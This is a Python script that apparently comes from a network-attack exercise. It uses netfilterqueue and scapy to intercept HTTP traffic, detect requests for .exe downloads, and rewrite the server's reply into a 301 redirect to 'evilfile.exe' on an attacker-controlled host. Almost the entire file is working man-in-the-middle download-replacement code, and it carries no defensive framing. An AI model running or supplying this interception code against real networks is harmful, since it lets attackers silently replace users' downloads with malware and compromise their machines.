import netfilterqueue
import scapy.all as scapy

# only work with http
ack_list = []


# def set_load(packet, load):
#     packet[scapy.Raw].load = ("HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar-x64-700vn.exe\n\n")
#     # 301 move permanently redirect link to the location we set
#     del packet[scapy.IP].len
#     del packet[scapy.IP].chksum
#     del packet[scapy.TCP].chksum
#     packet.set_payload(str(packet))
#     return packet
#

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 8080:  # dport = http (port 80)
            if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.233.135" not in scapy_packet[scapy.Raw].load:
                print("[+] .exe download request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # modified_packet=set_load(packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.88.131/evil_folder/evilfile.exe\n\n")
                scapy_packet[scapy.Raw].load = (
                    "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.233.135/evil_folder/evilfile.exe\n\n")
                # 301 move permanently redirect link to the location we set
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
                # packet.set_patload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
